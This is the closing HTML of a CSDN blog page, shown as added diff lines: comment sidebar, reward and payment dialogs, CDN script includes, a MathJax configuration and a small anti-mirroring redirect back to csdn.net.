+    <aside class="recommend-right_aside">
+        <div id="recommend-right-concision" >
+            <div class='flex-column aside-box groupfile' id="groupfileConcision">
+                <div class="groupfile-div1">
+                <h3 class="aside-title">目录</h3>
+                <div class="align-items-stretch group_item">
+                    <div class="pos-box">
+                        <div class="scroll-box">
+                            <div class="toc-box"></div>
+                        </div>
+                    </div>
+                </div>
+                </div>
+            </div>
+        </div>
+    </aside>
+</div>
+
+      </div>
+      <div class="mask-dark"></div>
+        <script type="text/javascript">
+        var timert = setInterval(function() {
+          sideToolbar = $(".csdn-side-toolbar");
+          if (sideToolbar.length > 0) {
+            sideToolbar.css('cssText', 'bottom:64px !important;')
+            clearInterval(timert);
+          }
+        }, 200);
+        </script>
+      <div class="skin-boxshadow"></div>
+      <div class="directory-boxshadow"></div>
+<div class="comment-side-box-shadow comment-side-tit-close" id="commentSideBoxshadow">
+<div class="comment-side-content">
+	<div class="comment-side-tit">
+		<span class="comment-side-tit-count">评论</span>	
+	<img class="comment-side-tit-close" src="https://csdnimg.cn/release/blogv2/dist/pc/img/closeBt.png"></div>
+  <div id="pcCommentSideBox" class="comment-box comment-box-new2 unlogin-comment-box-new" style="display:none">
+	
+	</div>
+	<div id="pcFlodCommentSideBox" class="pc-flodcomment-sidebox">
+		<div class="comment-fold-tit"><span id="lookUnFlodComment" class="back"><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowLeftWhite.png" alt=""></span>被折叠的&nbsp;<span class="count"></span>&nbsp;条评论
+		 <a href="https://blogdev.blog.csdn.net/article/details/122245662" class="tip" target="_blank">为什么被折叠?</a>
+		 <a href="https://bbs.csdn.net/forums/FreeZone" class="park" target="_blank">
+		 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/iconPark.png">到【灌水乐园】发言</a>                                
+		</div>
+		<div class="comment-fold-content"></div>
+		<div id="lookBadComment" class="look-bad-comment side-look-comment">
+			<a class="look-more-comment">查看更多评论<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/commentArrowDownWhite.png" alt=""></a>
+		</div>
+	</div>
+</div>
+<div class="comment-rewarddialog-box">
+  <div class="form-box">
+    <div class="title-box">
+      添加红包
+      <a class="btn-form-close"></a>
+    </div>
+    <form id="commentRewardForm">
+      <div class="ipt-box">
+        <label for="txtName">祝福语</label>
+        <div class="ipt-btn-box">
+          <input type="text" name="name" id="txtName" autocomplete="off" maxlength="50">
+          <a class="btn-ipt btn-random"></a>
+        </div>
+        <p class="notice">请填写红包祝福语或标题</p>
+      </div>
+      <div class="ipt-box">
+        <label for="txtSendAmount">红包数量</label>
+        <div class="ipt-txt-box">
+          <input type="text" name="sendAmount" maxlength="4" id="txtSendAmount" placeholder="请填写红包数量(最小10个)" autocomplete="off">
+          <span class="after-txt">个</span>
+        </div>
+        <p class="notice">红包个数最小为10个</p>
+      </div>
+      <div class="ipt-box">
+        <label for="txtMoney">红包总金额</label>
+        <div class="ipt-txt-box error">
+          <input type="text" name="money" maxlength="5" id="txtMoney" placeholder="请填写总金额(最低5元)" autocomplete="off">
+          <span class="after-txt">元</span>
+        </div>
+        <p class="notice">红包金额最低5元</p>
+      </div>
+      <div class="balance-info-box">
+        <label>余额支付</label>
+        <div class="balance-info">
+          当前余额<span class="balance">3.43</span>元
+          <a href="https://i.csdn.net/#/wallet/balance/recharge" class="link-charge" target="_blank">前往充值 ></a>
+        </div>
+      </div>
+      <div class="opt-box">
+        <div class="pay-info">
+          需支付：<span class="price">10.00</span>元
+        </div>
+        <button type="button" class="ml-auto btn-cancel">取消</button>
+        <button type="button" class="ml8 btn-submit" disabled="true">确定</button>
+      </div>
+    </form>
+  </div>
+</div>
+<div class="rr-guide-box">
+  <div class="rr-first-box">
+    <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward02.png" alt="">
+    <button class="btn-guide-known next">下一步</button>
+  </div>
+  <div class="rr-second-box">
+    <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward03.png" alt="">
+    <button class="btn-guide-known known">知道了</button>
+  </div>
+</div>
+</div>
+
+<div class="redEnvolope" id="redEnvolope">
+  <div class="env-box">
+    <div class="env-container">
+      <div class="pre-open" id="preOpen">
+        <div class="top">
+          <header>
+            <img class="clearTpaErr" :src="redpacketAuthor.avatar" alt="" />
+            <div class="author">成就一亿技术人!</div>
+          </header>
+          <div class="bot-icon"></div>
+        </div>
+        <footer>
+          <div class="red-openbtn open-start"></div>
+          <div class="tip">
+            领取后你会自动成为博主和红包主的粉丝
+            <a class="rule" target="_blank">规则</a>
+          </div>
+        </footer>
+      </div>
+      <div class="opened" id="opened">
+        <div class="bot-icon">
+          <header>
+            <a class="creatorUrl" href="" target="_blank">
+              <img class="clearTpaErr" src="https://profile-avatar.csdnimg.cn/default.jpg!2" alt="" />
+            </a>
+            <div class="author">
+              <div class="tt">hope_wisdom</div> 发出的红包
+            </div>
+          </header>
+        </div>
+        <div class="receive-box">
+          <header></header>
+          <div class="receive-list">
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="close-btn"></div>
+  </div>
+</div>
+      
+      <div class="pay-code">
+      <div class="pay-money">实付<span class="pay-money-span" data-nowprice='' data-oldprice=''>元</span></div>
+      <div class="content-blance"><a class="blance-bt" href="javascript:;">使用余额支付</a></div>
+      <div class="content-code">
+        <div id="payCode" data-id="">
+          <div class="renovate">
+            <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/pay-time-out.png">
+            <span>点击重新获取</span>
+          </div>
+        </div>
+        <div class="pay-style"><span><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/weixin.png"></span><span><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/zhifubao.png"></span><span><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/jingdong.png"></span><span class="text">扫码支付</span></div>
+      </div>
+      <div class="bt-close">
+        <svg t="1567152543821" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10924" xmlns:xlink="http://www.w3.org/1999/xlink" width="12" height="12">
+          <defs>
+            <style type="text/css"></style>
+          </defs>
+          <path d="M512 438.378667L806.506667 143.893333a52.032 52.032 0 1 1 73.6 73.621334L585.621333 512l294.485334 294.485333a52.074667 52.074667 0 0 1-73.6 73.642667L512 585.621333 217.514667 880.128a52.053333 52.053333 0 1 1-73.621334-73.642667L438.378667 512 143.893333 217.514667a52.053333 52.053333 0 1 1 73.621334-73.621334L512 438.378667z" fill="" p-id="10925"></path>
+        </svg>
+      </div>
+      <div class="pay-balance">
+        <input type="radio" class="pay-code-radio" data-type="details">
+        <span class="span">钱包余额</span>
+          <span class="balance" style="color:#FC5531;font-size:14px;">0</span>
+          <div class="pay-code-tile">
+            <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/pay-help.png" alt="">
+            <div class="pay-code-content">
+              <div class="span">
+                <p class="title">抵扣说明：</p>
+                <p> 1.余额是钱包充值的虚拟货币，按照1:1的比例进行支付金额的抵扣。<br> 2.余额无法直接购买下载，可以购买VIP、付费专栏及课程。</p>
+              </div>
+            </div>
+          </div>
+      </div>
+      <a class="pay-balance-con" href="https://i.csdn.net/#/wallet/balance/recharge" target="_blank"><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/recharge.png" alt=""><span>余额充值</span></a>
+    </div>
+    <div style="display:none;">
+      <img src="" onerror='setTimeout(function(){if(!/(csdn.net|iteye.com|baiducontent.com|googleusercontent.com|360webcache.com|sogoucdn.com|bingj.com|baidu.com)$/.test(window.location.hostname)){window.location.href="\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x63\x73\x64\x6e\x2e\x6e\x65\x74"}},3000);'>
+    </div>
+    <div class="keyword-dec-box" id="keywordDecBox"></div>
+  </body>
+  <script src="https://csdnimg.cn/release/blogv2/dist/components/js/axios-83fa28cedf.min.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/blogv2/dist/components/js/pc_wap_highlight-8defd55d6e.min.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/blogv2/dist/components/js/pc_wap_common-3c7b273c43.min.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/blogv2/dist/components/js/edit_copy_code-43c2d050a0.min.js" type="text/javascript"></script>
+  <script src="https://g.csdnimg.cn/lib/cboxEditor/1.1.6/embed-editor.min.js" type="text/javascript"></script>
+  <link rel="stylesheet" href="https://g.csdnimg.cn/lib/cboxEditor/1.1.6/embed-editor.min.css">
+  <link rel="stylesheet" href="https://csdnimg.cn/release/blog_editor_html/release1.6.12/ckeditor/plugins/codesnippet/lib/highlight/styles/atom-one-dark.css">
+  <script src="https://g.csdnimg.cn/user-accusation/1.0.6/user-accusation.js" type="text/javascript"></script>
+  <script>
+    // 全局声明
+    if (window.csdn === undefined) {
+      window.csdn = {};
+    }
+    var sideToolbarOpt = {}
+    $(function() {
+      $(document).on('click', "#toolReportBtnHideNormal,#toolReportBtnHide", function() {
+        window.csdn.loginBox.key({
+          biz: 'blog',
+          subBiz: 'other_service',
+          cb: function() {
+            window.csdn.feedback({
+              "type": 'blog',
+              "rtype": 'article',
+              "rid": articleId,
+              "reportedName": username,
+              "submitOptions": {
+                "title": articleTitle,
+                "contentUrl": articleDetailUrl
+              },
+              "callback": function() {
+                showToast({
+                  text: "感谢您的举报，我们会尽快审核！",
+                  bottom: '10%',
+                  zindex: 9000,
+                  speed: 500,
+                  time: 1500
+                })
+              }
+            })
+          }
+        })
+      });
+    })
+      window.csdn.sideToolbar = {
+        options: {
+          ...sideToolbarOpt,
+          theme: 'white',
+        }
+      }
+  </script>
+    <script src="https://g.csdnimg.cn/baidu-search/1.0.12/baidu-search.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/download/old_static/js/qrcode.js"></script>
+  <script src="https://g.csdnimg.cn/lib/qrcode/1.0.0/qrcode.min.js"></script>
+  <script src="https://g.csdnimg.cn/user-ordercart/3.0.1/user-ordercart.js" type="text/javascript"></script>
+  <script src="https://g.csdnimg.cn/user-ordertip/5.0.3/user-ordertip.js" type="text/javascript"></script>
+  <script src="https://g.csdnimg.cn/order-payment/4.0.5/order-payment.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/blogv2/dist/pc/js/common-48ed13f265.min.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/blogv2/dist/pc/js/detail-b15e6c982b.min.js" type="text/javascript"></script>
+  <script src="https://csdnimg.cn/release/blogv2/dist/pc/js/column-6c0f4f56fb.min.js" type="text/javascript"></script>
+    <script src="https://g.csdnimg.cn/side-toolbar/3.6/side-toolbar.js" type="text/javascript"></script>
+  <script src="https://g.csdnimg.cn/copyright/1.0.4/copyright.js" type="text/javascript"></script>
+  <script>
+    $(".MathJax").remove();
+    if ($('div.markdown_views pre.prettyprint code.hljs').length > 0) {
+      $('div.markdown_views')[0].className = 'markdown_views';
+    }
+  </script>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        displayMath: [['$$', '$$'], ['\\[', '\\]']],
+        processEscapes: true,
+        processClass: "mathjax",
+        ignoreClass: "title-article|no-mathjax",
+        preview: "none"
+      },
+      
+      // 优先使用 HTML-CSS 而非 NativeMML
+      "HTML-CSS": {
+        preferredFont: "STIX",        // 使用 STIX 字体
+        availableFonts: ["STIX", "TeX"],
+        webFont: "STIX-Web",
+        scale: 100,                   // 放大 20%
+        minScaleAdjust: 100,
+        linebreaks: { 
+          automatic: true, 
+          width: "90% container" 
+        },
+        matchFontHeight: true,
+        styles: {
+          ".MathJax": {
+            "font-weight": "500 !important"  // 加粗
+          }
+        }
+      },
+      
+      // 禁用 NativeMML（浏览器原生渲染质量不好）
+      NativeMML: {
+        scale: 100
+      },
+      
+      // 设置优先级：HTML-CSS > SVG > NativeMML
+      menuSettings: {
+        renderer: "HTML-CSS"
+      },
+      
+      messageStyle: "none"
+    });
+    MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+  </script>
+  <script src="https://g.csdnimg.cn/static/mathjax-2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/javascript" crossorigin src="https://g.csdnimg.cn/common/csdn-login-box/csdn-login-box.js"></script></html>
